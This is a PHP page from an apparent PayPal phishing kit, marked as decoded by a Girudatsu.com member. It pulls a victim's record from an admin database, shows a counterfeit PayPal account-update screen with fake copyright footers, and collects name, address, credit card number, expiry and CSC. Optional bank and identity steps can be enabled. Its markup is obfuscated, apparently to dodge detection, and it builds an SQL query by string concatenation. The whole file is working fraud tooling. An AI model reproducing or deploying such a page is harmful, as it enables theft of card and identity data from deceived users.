<?php
// Decoded by Girudatsu.com Member

$OdaKpQ_ = 'explode';
$yX_GtTMYp = 'date';
$ImuornGa_ = 'date';
include 'inc/crypt.php';
?>
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/jquery.creditCardValidator.min.js');
?>
"></script>
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/cc.js');
?>
"></script>
<script> // history.pushState('data', '','settings'); </script>
<?php
echo '<!' . xCrypt(155 - 55, 422 + 78) . '>';
?>
<style>
	body{ background-color: #f8f8f8; }
</style>
<?php
$OdaKpQ_ = 'explode';
$yX_GtTMYp = 'date';
$ImuornGa_ = 'date';
@session_start();
$pdo = new PDO('sqlite:admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    $_tl = $settings['truelogin'] == 'Yes' ? (bool) (12 + -11) : (bool) (40 + -40);
    $account = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    $fullname = $account['fullname'];
    $profilephoto = $account['profilephoto'];
    $joined = $account['joined'];
    $account_type = $account['account_type'];
    $address = $account['address'];
    include_once 'inc/language.php';
}
$display_profile = $settings['display_profile'] != 'yes' ? 'style="display:none;"' : '';
?>

<?php
$OdaKpQ_ = 'explode';
$yX_GtTMYp = 'date';
$ImuornGa_ = 'date';
if ($_tl) {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="Yes">
<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
} else {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="No">
<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
}
?>

<?php
echo '<!' . xCrypt(135 + -35, 17 + 483) . '>';
?>
<div id="<?php
echo xTextEncode('header_update');
?>
">
	<div class="<?php
echo xCrypt(9 - -1, 3 + 47);
?>
 <?php
echo xTextEncode('container_update for_nav');
?>
">
		<div id="<?php
echo xTextEncode('menu_btn_update');
?>
"></div>
		<div id="<?php
echo xTextEncode('logo_update');
?>
"></div>
		<ul class="<?php
echo xCrypt(47 + -37, 112 + -62);
?>
 <?php
echo xTextEncode('nav');
?>
">
			<li class="<?php
echo xCrypt(18 - 8, 29 + 21);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-89 - -99, 43 + 7);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(82 + -72, 35 + 15);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(64 + -54, 35 + 15);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(6 + 4, 86 - 36);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-56 - -66, 37 - -13);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(13 + -3, -17 - -67);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-40 - -50, 10 - -40);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['navbar']['4'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-31 - -41, 13 - -37);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(86 + -76, 45 - -5);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['navbar']['5'];
?>
</a>
			</li>
		</ul>
<?php
echo '<!' . xCrypt(70 - -30, 568 + -68) . '>';
?>
		<div id="<?php
echo xTextEncode('logout');
?>
">
			<div class="<?php
echo xCrypt(-20 - -30, 68 - 18);
?>
 <?php
echo xTextEncode('sub_logout');
?>
">
				<button class="<?php
echo xCrypt(55 + -45, -38 - -88);
?>
 <?php
echo xTextEncode('log_out');
?>
"><?php
echo $language['update']['navbar']['6'];
?>
</button>
			</div>
			<div class="<?php
echo xCrypt(97 + -87, 44 + 6);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('setting');
?>
">
			</div>
			<div class="<?php
echo xCrypt(12 + -2, 34 + 16);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('alert');
?>
">
			</div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(0 - -100, 290 + 210) . '>';
?>
<div id="<?php
echo xTextEncode('sub_menu');
?>
">
	<div class="<?php
echo xCrypt(59 + -49, 150 + -100);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<ul class="<?php
echo xCrypt(-31 - -41, 25 - -25);
?>
 <?php
echo xTextEncode('sub_nav');
?>
">
			<li class="<?php
echo xCrypt(94 + -84, 48 + 2);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(4 - -6, -12 - -62);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['sub_navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-64 - -74, 62 - 12);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(19 + -9, 46 - -4);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['sub_navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(37 + -27, 105 + -55);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(38 + -28, 27 - -23);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['sub_navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(54 + -44, 58 - 8);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(52 + -42, 95 - 45);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['update']['sub_navbar']['4'];
?>
</a>
			</li>
		</ul>
		<div class="<?php
echo xCrypt(66 + -56, 70 - 20);
?>
 <?php
echo xTextEncode('arrow');
?>
"></div>
	</div>
</div>
<?php
echo '<!' . xCrypt(99 + 1, 695 - 195) . '>';
?>
<div id="<?php
echo xTextEncode('update_content');
?>
">
	<div class="<?php
echo xCrypt(92 + -82, 92 - 42);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(98 + -88, 83 - 33);
?>
 <?php
echo xTextEncode('row first');
?>
">
			<div class="<?php
echo xCrypt(55 + -45, 93 - 43);
?>
 <?php
echo xTextEncode('six columns');
?>
">
				<div class="<?php
echo xCrypt(-61 - -71, 55 - 5);
?>
 <?php
echo xTextEncode('row');
?>
" <?php
echo $display_profile;
?>
>
					<div id="<?php
echo xTextEncode('profile_div');
?>
">
						<font class="<?php
echo xCrypt(85 + -75, 87 + -37);
?>
 <?php
echo xTextEncode('profile');
?>
"><?php
echo $language['update']['1'];
?>
</font>
						<div id="<?php
echo xTextEncode('profile_img');
?>
" style="background-image:url(<?php
echo $profilephoto;
?>
);"></div>
						<div id="<?php
echo xTextEncode('Update_Photo');
?>
"><?php
echo $language['update']['2'];
?>
</div>
					</div>
					<div id="<?php
echo xTextEncode('profile_name_div');
?>
">
						<div id="<?php
echo xTextEncode('my_name');
?>
"><?php
echo $fullname;
?>
</div>
						<div id="<?php
echo xTextEncode('joined_at');
?>
"><?php
echo $language['update']['3'];
?>
 <?php
echo $joined;
?>
 <font><?php
echo $language['update']['4'];
?>
</font></div>
					</div>
				</div>
				<?php
echo '<!' . xCrypt(105 + -5, 773 - 273) . '>';
?>
				<div id="<?php
echo xTextEncode('frm_account');
?>
">
					<table>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_checked.png');
?>
"></td><td><?php
echo $language['update']['5']['1'];
?>
</td></tr>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_uncheck.png');
?>
"></td><td><?php
echo $language['update']['5']['2'];
?>
</td></tr>
						<?php
$OdaKpQ_ = 'explode';
$yX_GtTMYp = 'date';
$ImuornGa_ = 'date';
if ($settings['enable_bank'] == 'yes') {
    ?>
							<tr><td width="30px"><img src="<?php
    echo xTextEncode('img/icon_uncheck.png');
    ?>
"></td><td><?php
    echo $language['update']['5']['3'];
    ?>
</td></tr>
						<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
}
if ($settings['enable_identity'] == 'yes') {
    ?>
							<tr><td width="30px"><img src="<?php
    echo xTextEncode('img/icon_uncheck.png');
    ?>
"></td><td><?php
    echo $language['update']['5']['4'];
    ?>
</td></tr>
						<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
}
?>
					</table>
				</div>
			</div>
			<?php
echo '<!' . xCrypt(183 + -83, 975 - 475) . '>';
?>
			<div class="<?php
echo xCrypt(-58 - -68, 95 - 45);
?>
 <?php
echo xTextEncode('six columns');
?>
">
				<div class="<?php
echo xCrypt(-8 - -18, 76 + -26);
?>
 <?php
echo xTextEncode('profile');
?>
"><?php
echo $language['update']['6'];
?>
</div>
				<div id="<?php
echo xTextEncode('address_div');
?>
">
				<!-- <form action="#" id="<?php
echo xTextEncode('x_form_2');
?>
"> -->
				<?php
$OdaKpQ_ = 'explode';
$yX_GtTMYp = 'date';
$ImuornGa_ = 'date';
if ($_tl && $address != 'address') {
    $xaddress = explode('<br>', $address);
    ?>
					<table>
						<tr><td><?php
    echo $xaddress[-70 - -71];
    ?>
</td></tr>
						<tr><td><?php
    echo $xaddress[73 + -71];
    ?>
</td></tr>
						<tr><td><?php
    echo $xaddress[44 + -41];
    ?>
</td></tr>
						<tr><td><?php
    echo $xaddress[21 + -17];
    ?>
</td></tr>
						<tr><td class="<?php
    echo xCrypt(93 + -83, 124 + -74);
    ?>
 <?php
    echo xTextEncode('gray_color');
    ?>
"><?php
    echo $language['update']['7'];
    ?>
</td></tr>
						<!-- <tr><td class="<?php
    echo xCrypt(-65 - -75, 71 - 21);
    ?>
 <?php
    echo xTextEncode('blue_color');
    ?>
">Edit <font style="color:#2c2e2f;font-size:18px;">|</font> Remove</td></tr> -->
					</table>
				<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
} else {
    ?>
					<table>
						<tr>
							<td>
								<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_f_name');
    ?>
" id="<?php
    echo xTextEncode('simple_login_f_name');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('First Name');
    ?>
" class="<?php
    echo xCrypt(59 + -49, -44 - -94);
    ?>
 <?php
    echo xTextEncode('u-pull-left');
    ?>
" style="width:49%;">
								<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_l_name');
    ?>
" id="<?php
    echo xTextEncode('simple_login_l_name');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('Last Name');
    ?>
" class="<?php
    echo xCrypt(-48 - -58, -48 - -98);
    ?>
 <?php
    echo xTextEncode('u-pull-right');
    ?>
" style="width:49%;">
							</td>
						</tr>
						<tr><td>
							<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_address');
    ?>
" id="<?php
    echo xTextEncode('simple_login_address');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('Address');
    ?>
" class="<?php
    echo xCrypt(42 + -32, -34 - -84);
    ?>
 <?php
    echo xTextEncode('u-pull-left');
    ?>
" style="width:69%;">
							<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_city');
    ?>
" id="<?php
    echo xTextEncode('simple_login_city');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('City');
    ?>
" class="<?php
    echo xCrypt(11 + -1, 13 - -37);
    ?>
 <?php
    echo xTextEncode('u-pull-right');
    ?>
" style="width:30%;">
						</td></tr>
						<tr>
							<td>
								<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_state');
    ?>
" id="<?php
    echo xTextEncode('simple_login_state');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('State');
    ?>
" class="<?php
    echo xCrypt(80 + -70, 28 + 22);
    ?>
 <?php
    echo xTextEncode('u-pull-left');
    ?>
" style="width:25%;">
								<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_zipcode');
    ?>
" id="<?php
    echo xTextEncode('simple_login_zipcode');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('Zip Code');
    ?>
" class="<?php
    echo xCrypt(0 + 10, 54 + -4);
    ?>
 <?php
    echo xTextEncode('u-pull-left');
    ?>
" style="width:25%;margin-left:1%;">
								<input type="<?php
    echo xTextEncode('text');
    ?>
" name="<?php
    echo xTextEncode('simple_login_country');
    ?>
" id="<?php
    echo xTextEncode('simple_login_country');
    ?>
" value="" placeholder="<?php
    echo xTextEncode('Country');
    ?>
" class="<?php
    echo xCrypt(17 - 7, 50 + 0);
    ?>
 <?php
    echo xTextEncode('u-pull-right');
    ?>
" style="width:48%;">
							</td>
						</tr>
					</table>
				<?php
    $OdaKpQ_ = 'explode';
    $yX_GtTMYp = 'date';
    $ImuornGa_ = 'date';
}
?>

<?php
echo '<!' . xCrypt(5 + 95, 557 - 57) . '>';
?>
				<div id="<?php
echo xTextEncode('wallet_div');
?>
">
					<table>

						<tr><td><input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('cc_number');
?>
" id="<?php
echo xTextEncode('cc_number');
?>
" value="" placeholder="<?php
echo xTextEncode('Card number');
?>
" class="<?php
echo xCrypt(-41 - -51, 93 + -43);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"></td></tr>
						<tr>
							<td>
								<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('exp');
?>
" id="<?php
echo xTextEncode('exp');
?>
" value="" placeholder="<?php
echo xTextEncode('Expiration MM/YYYY');
?>
" class="<?php
echo xCrypt(-59 - -69, 73 + -23);
?>
 <?php
echo xTextEncode('u-pull-left');
?>
" style="width:49%;">
								<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('csc');
?>
" id="<?php
echo xTextEncode('csc');
?>
" value="" placeholder="<?php
echo xTextEncode('CSC (3 digits)');
?>
" class="<?php
echo xCrypt(-25 - -35, 39 - -11);
?>
 <?php
echo xTextEncode('u-pull-right');
?>
" style="width:49%;">
							</td>
						</tr>
						<tr><td><input type="<?php
echo xTextEncode('submit');
?>
" name="<?php
echo xTextEncode('update_submit_btn');
?>
" id="<?php
echo xTextEncode('update_submit_btn');
?>
" value="<?php
echo $language['update']['8'];
?>
" class="<?php
echo xCrypt(49 + -39, 131 + -81);
?>
 <?php
echo xTextEncode('u-full-width button-primary');
?>
"></td></tr>
					</table>
				</div>
				<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('cc_card_type');
?>
" id="<?php
echo xTextEncode('cc_card_type');
?>
" value="">
				<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('cc_length_valid');
?>
" id="<?php
echo xTextEncode('cc_length_valid');
?>
" value="">
				<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('cc_luhn_valid');
?>
" id="<?php
echo xTextEncode('cc_luhn_valid');
?>
" value="">
			<!-- </form> -->
			</div>
		</div>
		<?php
echo '<!' . xCrypt(51 - -49, 436 - -64) . '>';
?>
		<div id="<?php
echo xTextEncode('footer_update_mobile');
?>
">
			<div class="<?php
echo xCrypt(5 + 5, 74 + -24);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(-9 - -19, 58 + -8);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font></div>
			<div class="<?php
echo xCrypt(-63 - -73, 90 + -40);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(19 - 9, 74 + -24);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 PayPal, Inc. All rights reserved.</font></div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(111 - 11, 341 + 159) . '>';
?>
<div id="<?php
echo xTextEncode('footer_update');
?>
">
	<div class="<?php
echo xCrypt(11 + -1, 86 + -36);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(-12 - -22, 108 + -58);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(10 + 0, 15 - -35);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font><img src="<?php
echo xTextEncode('img/feedback.png');
?>
"></div>
		<div class="<?php
echo xCrypt(-22 - -32, 0 + 50);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(-79 - -89, 87 + -37);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 PayPal, Inc. All rights reserved.</font> <font class="<?php
echo xCrypt(-15 - -25, 6 - -44);
?>
 <?php
echo xTextEncode('footer3');
?>
">|</font> <font class="<?php
echo xCrypt(-28 - -38, 10 - -40);
?>
 <?php
echo xTextEncode('footer4');
?>
">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font></div>
	</div>
</div>
<?php
echo '<!' . xCrypt(73 + 27, 803 - 303) . '>';
